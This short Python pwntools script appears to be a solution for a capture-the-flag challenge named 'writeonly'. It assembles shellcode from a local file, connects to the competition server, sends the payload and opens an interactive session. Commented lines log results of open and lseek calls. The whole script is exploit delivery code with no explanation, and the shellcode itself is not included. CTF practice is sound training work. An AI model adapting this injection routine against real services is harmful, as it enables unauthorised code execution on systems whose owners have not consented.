from pwn import *
import subprocess


subprocess.run(["nasm", "shellcode.asm"])
with open('shellcode', 'rb') as f:
    sc = f.read()

log.info('shellcode length is {}'.format(len(sc)))


io = remote('writeonly.2020.ctfcompetition.com', 1337)

io.recvuntil('length? ')
io.sendline(str((len(sc))))
io.recvuntil('shellcode. ')
io.send(sc)
# res_open = io.recv(4)
# log.info('open returned: {}'.format(u32(res_open)))
# res_lseek = io.recv(4)
# log.info('lseek returned: {}'.format(hex(u32(res_lseek))))

io.interactive()